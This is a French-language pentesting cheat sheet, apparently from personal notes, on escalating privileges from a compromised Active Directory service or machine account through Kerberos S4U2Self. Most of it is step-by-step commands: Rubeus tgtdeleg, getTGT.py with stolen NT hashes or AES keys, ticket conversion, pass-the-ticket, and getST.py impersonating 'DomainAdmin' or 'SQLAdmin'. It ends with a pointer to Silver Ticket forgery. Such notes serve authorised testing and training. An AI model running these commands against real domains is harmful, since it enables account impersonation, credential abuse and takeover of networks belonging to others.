

Si un compte de service est compromis (hash NT récupéré ou Ticket Kerberos extrait ou requêté à partir de la session), possible d'usurper n'importe quel utilisateur pour le service et escalader les privilèges sur celui-ci. 

> [!Tip]
> A partir de comptes de services virtuel (local) (defaultapppool, mssqlservice... ou NT AUTHORITY\Network Service), il est possible de requêter un TGT pour le compte de **machine** et faire une escalade de privilège local et dump SAM, LSA ...

Hash NT / Clé AES -> **Silver Ticket / S4U2Self**
Ticket Kerberos -> **S4U2Self**



# S4U2Self


1. Depuis une session avec le compte de service, récupérer un TGT si nécessaire.

```powershell
.\Rubeus.exe tgtdeleg /nowrap 
```

ou Over Pass the hash / Pass the key si nous avons le hash NT ou la clé kerberos

```sh
getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"
```

```sh
getTGT.py -dc-ip "$DC_IP" -aes256 "AES_KEY" "$DOMAIN"/"machine$"
```


2. Le passer au format kirbi puis ccache si nécessaire

```sh
echo "<base64_ticket>" | base64 -d > ticket.kirbi | ticketconverter.py ticket.kirbi ticket.ccache
```

3. Vérifier le User Name dans le ticket (compte de service du domaine ou compte de machine ?)

```sh
describeTicket.py ticket.ccache
```

4. Pass the ticket

```sh
export KRB5CCNAME="ticket.ccache"
```

5. Exploiter S4U2Self en demandant un ticket de service au nom de n'importe quel utilisateur.

exemple pour un compte de machine
```sh
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
```

exemple pour un compte de service mssql
```sh
getST.py -self -impersonate "SQLAdmin" -altservice "mssqlsvc/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'sql_svc'
```


---
# Silver Ticket

[[2. Ticket Forgery#Silver Ticket]]

